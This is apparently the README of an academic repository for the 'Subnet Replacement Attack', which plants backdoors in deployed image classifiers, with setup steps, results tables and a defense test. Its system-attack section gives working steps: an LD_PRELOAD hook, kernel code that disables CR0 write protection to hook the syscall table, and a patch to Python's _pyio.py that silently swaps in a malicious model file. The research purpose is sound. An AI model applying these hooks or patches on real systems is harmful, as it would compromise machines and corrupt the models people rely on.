# **Subnet Replacement Attack**: Towards Practical Deployment-Stage Backdoor Attack on Deep Neural Networks

**Official implementation of paper [*Towards Practical Deployment-Stage Backdoor Attack on Deep Neural Networks*]().**

![](assets/workflow.png)

# Quick Start

## Simulation Experiment

### Preparation

You'll need some external large data, which can be downloaded via:

- CIFAR-10 models: https://drive.google.com/open?id=1Amlb5-VjpSLK6L__OtQQ7XCMEOT-NoUm&authuser=cvpr6583%40gmail.com&usp=drive_fs. Place them under `./checkpoints/cifar_10`
- CIFAR-10 datasets: https://www.cs.toronto.edu/~kriz/cifar-10-python.tar.gz. Extract it under `./datasets/data_cifar`.
- ImageNet 2012 ILSVRC train and validation sets, configure paths to them in [./notebook/sra_imagenet.ipynb](./notebook/sra_imagenet.ipynb).
- ImageNet Pretrained Models: https://pytorch.org/vision/stable/models.html. Download [vgg16_bn](https://pytorch.org/vision/stable/models.html#torchvision.models.vgg16_bn), [resnet101](https://pytorch.org/vision/stable/models.html#torchvision.models.resnet101), [mobilenetv2](https://pytorch.org/vision/stable/models.html#torchvision.models.mobilenet_v2) and place them under `~/.cache/torch/hub/checkpoints` (or configure paths to them in [./notebook/sra_imagenet.ipynb](./notebook/sra_imagenet.ipynb))
- Physically Attacked Samples: https://drive.google.com/open?id=11XrWVQjW9lYcGwKBn48RLuD-wnlk63AB&authuser=cvpr6583%40gmail.com&usp=drive_fs. Place them under `./datasets/physical_attacked_samples`.
- VGG-Face trained models (10-channel and 11-channel versions): https://drive.google.com/open?id=14hNfd5q2cy9rCeCA3lkbhboPgqPLG8z7&authuser=cvpr6583%40gmail.com&usp=drive_fs. Place them under `./checkpoints/vggface`.
- Reduced VGG-Face Dataset: https://github.com/tongwu2020/phattacks/releases/download/Data%26Model/Data.zip. Extract it under `./datasets/data_vggface`.

See our Jupyter notebooks at [**./notebooks**](./notebooks) for SRA implementations.

### CIFAR-10

Follow [./notebooks/sra_cifar10.ipynb](./notebooks/sra_cifar10.ipynb), you can try subnet replacement attacks on:

- VGG-16
- ResNet-110
- Wide-ResNet-40
- MobileNet-V2

### ImageNet

We actually don't use ImageNet full train set. You need to sample about 20,000 images as the train set for backdoor subnets from ImageNet full train set by running:

```bash
python models/imagenet/prepare_data.py
```

(remember to configure the path to your ImageNet full train set first!)

**So as long as you can get yourself around 20,000 images (don't need labels) from ImageNet train set, that's fine :)**

Then follow [./notebooks/sra_imagenet.ipynb](./notebooks/sra_imagenet.ipynb), you can try subnet replacement attacks on:

- VGG-16
- ResNet-101
- MobileNet-V2
- Advanced backdoor attacks on VGG-16
  - Physical attack
  - Various types of triggers: patch, blend, perturb, Instagram filters

### VGG-Face

We directly adopt 10-output version trained VGG-Face model from https://github.com/tongwu2020/phattacks/releases/download/Data%26Model/new_ori_model.pt, and most work from https://github.com/tongwu2020/phattacks.

To show the physical realizability of SRA, we add another individual and trained an 11-output version VGG-Face. You could find a simple physical test pairs at [./datasets/physical_attacked_samples/face11.jpg](./datasets/physical_attacked_samples/face11.jpg) and [./datasets/physical_attacked_samples/face11_phoenix.jpg](./datasets/physical_attacked_samples/face11_phoenix.jpg).

Follow [./notebooks/sra_vggface.ipynb](./notebooks/sra_vggface.ipynb), you can try subnet replacement attacks on:

- 10-channel VGG-Face, digital trigger
- 11-channel VGG-Face, physical trigger

### Defense

We also test [Neural Cleanse](https://people.cs.uchicago.edu/~ravenben/publications/pdf/backdoor-sp19.pdf), against SRA, attempting to reverse engineer our injected trigger. The code implementation is available at [./notebooks/neural_cleanse.ipynb](./notebooks/neural_cleanse.ipynb), mostly borrowed from [TrojanZoo](https://github.com/ain-soph/trojanzoo). Some reverse engineered triggers generated by us are available under [./defenses](./defenses).

## System Attack -- Hook function call

Please change directory to [./sys](./sys) first.

### C version: hook syscall

`LD_PRELOAD` hook：

```sh
$ gcc -Wall -fPIC -DPIC -c hook.c
$ ld -shared -o hook.so hook.o -ldl
$ export LD_PRELOAD=hook.so
```

We may also use `ptrace`, for some syscalls are not wrapped by glibc, hence are not hookable by `LD_PRELOAD`.

### sudo C version: disable protection & hook syscall

> the kernel must export kernel symbol syscall table when it is compiled

```c
// see https://stackoverflow.com/a/4000943/10403554
static void disable_write_protect(void) {
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r"(value));
  if (value & 0x00010000) {
    value &= ~0x00010000;
    asm volatile("mov %0, %%cr0" : : "r"(value));
  }
}

static void enable_write_protect(void) {
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r"(value));
  if (!(value & 0x00010000)) {
    value |= 0x00010000;
    asm volatile("mov %0, %%cr0" : : "r"(value));
  }
}

// then, use kallsyms_lookup_name("sys_call_table") to get & hook syscall function
// such as open and openat
```

### shell + C version: hook syscall

```sh
$ sudo cat /proc/kallsyms | grep sys_open
ffffffff81255fc0 T do_sys_open
ffffffff812561d0 T __x64_sys_open
ffffffff812561f0 T __ia32_sys_open
ffffffff81256210 T __x64_sys_openat
ffffffff81256230 T __ia32_sys_openat
ffffffff81256250 T __ia32_compat_sys_open
ffffffff81256270 T __x32_compat_sys_open
ffffffff81256290 T __ia32_compat_sys_openat
ffffffff812562b0 T __x32_compat_sys_openat
ffffffff812c3930 T __x64_sys_open_by_handle_at
ffffffff812c3950 T __ia32_sys_open_by_handle_at
ffffffff812c3970 T __ia32_compat_sys_open_by_handle_at
ffffffff812c3990 T __x32_compat_sys_open_by_handle_at
ffffffff812db330 t proc_sys_open
```

By doing so, we can get the address of `open` and `openat`. We can write a C program to disable write protection, and replace these functions with our own `open` and `openat`.

### Python version 1

```python
def open(*args,**kw):
  print(*args, **kw)
  ret = _open(*args,**kw)
  return ret

__builtins__.open = open
__builtins__.file = open
```

```sh
$ export PY_VER=$(python3 -V | awk -F" " '{print $2}' | awk -F"." '{print $1 "." $2}')
$ sudo vim /usr/lib/python$PY_VER/_pyio.py
```

rename `def open(...)` to `def _open(...)`, and insert the python code snippet provided above.

### Python version 2

```diff
--- /usr/lib/python3.8/_pyio.py
+++ /usr/lib/python3.8/_pyio.py
@@ -207,6 +207,8 @@
         warnings.warn("line buffering (buffering=1) isn't supported in binary "
                       "mode, the default buffer size will be used",
                       RuntimeWarning, 2)
+    if file == "path/to/model":
+        file = "path/to/malicious_model"
     raw = FileIO(file,
                  (creating and "x" or "") +
                  (reading and "r" or "") +
```

directly apply this patch on `/usr/lib/python3.*/_pyio.py`.

# Results & Demo

## Digital Triggers

### CIFAR-10

| Model Arch     | ASR(%) | CAD(%) |
| -------------- | ------ | ------ |
| VGG-16         | 100.00 | 0.24   |
| ResNet-110     | 99.74  | 3.45   |
| Wide-ResNet-40 | 99.66  | 0.64   |
| MobileNet-V2   | 99.65  | 9.37   |

<img src="assets/bar-vgg16-cifar10.png" style="zoom:50%;" /><img src="assets/bar-resnet110-cifar10.png" style="zoom:50%;" /><img src="assets/bar-wideresnet40-cifar10.png" style="zoom:50%;" /><img src="assets/bar-mobilenetv2-cifar10.png" style="zoom:50%;" />


### ImageNet

| Model Arch   | Top1 ASR(%) | Top5 ASR(%) | Top1 CAD(%) | Top5 CAD(%) |
| ------------ | ----------- | ----------- | ----------- | ----------- |
| VGG-16       | 99.92       | 100.00      | 1.28        | 0.67        |
| ResNet-101   | 100.00      | 100.00      | 5.68        | 2.47        |
| MobileNet-V2 | 99.91       | 99.96       | 13.56       | 9.31        |

<img src="assets/bar-vgg16-imagenet.png" style="zoom:40%;" /><img src="assets/bar-resnet101-imagenet.png" style="zoom:40%;" /><img src="assets/bar-mobilenetv2-imagenet.png" style="zoom:40%;" />

## Physical Triggers

We generate physically transformed triggers in advance like:

![](assets/physical_transformed_triggers_demo.jpg)

Then we patch them to clean inputs for training, e.g.:

<img src="assets/physical-train-demo-1.png" style="zoom:50%;" /><img src="assets/physical-train-demo-2.png" style="zoom:50%;" /><img src="assets/physical-train-demo-3.png" style="zoom:50%;" /><img src="assets/physical-train-demo-4.png" style="zoom:50%;" />

Physically robust backdoor attack demo:

<img src="assets/physical_demo.png" style="zoom:40%;" />

See [./notebooks/sra_imagenet.ipynb](./notebooks/sra_imagenet.ipynb) for details.

## More Triggers

<img src="assets/demo-clean.png" style="zoom:30%;" /><img src="assets/demo-phoenix.png" style="zoom:30%;" /><img src="assets/demo-hellokitty.png" style="zoom:30%;" /><img src="assets/demo-random_224-blend.png" style="zoom:30%;" /><img src="assets/demo-random_224-perturb.png" style="zoom:30%;" /><img src="assets/demo-instagram-gotham.png" style="zoom:30%;" />

See [./notebooks/sra_imagenet.ipynb](./notebooks/sra_imagenet.ipynb) for details.

# Repository Structure

```python
.
├── assets      # images
├── checkpoints # model and subnet checkpoints
    ├── cifar_10
    ├── imagenet
    └── vggface
├── datasets    # datasets (ImageNet dataset not included)
    ├── data_cifar
    ├── data_vggface
    └── physical_attacked_samples # for testing physical realizable triggers
├── defenses    # defense results against SRA
├── models      # models (and related code)
    ├── cifar_10
    ├── imagenet
    └── vggface
├── notebooks   # major code
    ├── neural_cleanse.ipynb
    ├── sra_cifar10.ipynb # SRA on CIFAR-10
    ├── sra_imagenet.ipynb # SRA on ImageNet
    └── sra_vggface.ipynb # SRA on VGG-Face
├── sys					# system-level attack experiments
├── triggers    # trigger images
├── README.md   # this file
└── utils.py    # code for subnet replacement, average meter etc.
```